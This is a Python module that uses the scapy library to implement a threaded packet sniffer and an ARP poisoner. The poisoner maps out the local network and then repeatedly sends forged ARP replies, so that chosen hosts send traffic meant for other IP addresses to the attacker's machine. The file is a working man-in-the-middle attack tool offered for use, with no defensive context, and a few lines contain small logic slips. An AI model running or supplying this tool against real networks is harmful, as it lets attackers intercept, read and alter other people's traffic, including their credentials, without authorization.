# coding: utf-8
import scapy.all as scapy
import enum
import net
import threading

class Sniffer(threading.Thread):
    def __init__(self, iface=None, prn=None, store=True, quantum=0.25):
        threading.Thread.__init__(self)
        self.iface = iface
        self.prn = prn
        self.store = store
        self.quantum = quantum

        self.packets = []

        self._l2socket = None
        self._stopevent = threading.Event()

    def run(self):
        try:
            self._l2socket = scapy.conf.L2listen(iface=self.iface)
            while not self._stopevent.is_set():
                pkts = self._l2socket.sniff(timeout=self.quantum, prn=self.prn, store=self.store)
                self.packets.extend(pkts)
        finally:
            if self._l2socket is not None:
                self._l2socket.close()

    def stop(self):
        self._stopevent.set()

class ArpPoisoner(threading.Thread):
    def __init__(self, iface=None, hwaddr=None, target=None, impersonate=None, store=False, quantum=1):
        threading.Thread.__init__(self)
        self.iface = iface
        self.store = store
        self.quantum = quantum
        self.hwaddr = hwaddr or str(net.ifhwaddr(self.iface))
        self.target = target
        self.impersonate = impersonate

        self.packets = []
        self.cache = {}

        self._l2socket = None
        self._stopevent = threading.Event()

    def cache_arp(self, pkt):
        if scapy.Ether in pkt and scapy.ARP in pkt:
            src = pkt[scapy.Ether].src
            if src != '0.0.0.0' and src != self.hwaddr:
                psrc = pkt[scapy.ARP].psrc
                if psrc != '0.0.0.0':
                    self.cache[psrc] = src

    @staticmethod
    def enumerate(net):
        if isinstance(net, str):
            net = scapy.Net(net)
        return net

    def arping(self, target=None):
        # Figure out who we are trying to resolve
        if target is None:
            if self.target is None or self.impersonate is None:
                pdst = net.ifcidr(self.iface)
            else:
                # It has to be a list because scapy can be really cool, but also kinda wonky
                pdst = list(set(self.enumerate(self.target)) | set(self.enumerate(self.target)))
        else:
            pdst = target

        # Send out an arp "who-has" requests
        pkts = scapy.Ether(src=self.hwaddr, dst='ff:ff:ff:ff:ff:ff')/scapy.ARP(op='who-has', hwsrc=self.hwaddr, pdst=pdst)
        scapy.sendp(pkts, iface=self.iface)

    def arpoison(self, target=None, impersonate=None):
        # Chose the target and impersonation lists
        impersonate = impersonate or self.impersonate or net.ifcidr(self.iface)
        target = target or self.target or net.ifcidr(self.iface)
        ifaddr = str(net.ifaddr(self.iface))

        # Filter out targets and impersonations not in our ARP cache
        pdst = [ip for ip in self.enumerate(target) if ip in self.cache]
        psrc = [ip for ip in self.enumerate(impersonate) if ip in self.cache]

        # Build the packet list and filter out packets that would be sent to the true ip owner
        pkts = [scapy.Ether(src=self.hwaddr, dst=self.cache[ip])/scapy.ARP(op=['who-has', 'is-at'], hwsrc=self.hwaddr, psrc=psrc, pdst=ip) for ip in pdst]
        pkts = [p for p in pkts if p.psrc != p.pdst and p.dst != ifaddr]

        # Launch the payload
        scapy.sendp(pkts, iface=self.iface)

    def run(self):
        try:
            self._l2socket = scapy.conf.L2listen(iface=self.iface)
            self.arping()
            while not self._stopevent.is_set():
                self.arpoison()
                pkts = self._l2socket.sniff(timeout=self.quantum, prn=self.cache_arp, store=self.store)
                self.packets.extend(pkts)
        finally:
            if self._l2socket is not None:
                self._l2socket.close()

    def stop(self):
        self._stopevent.set()
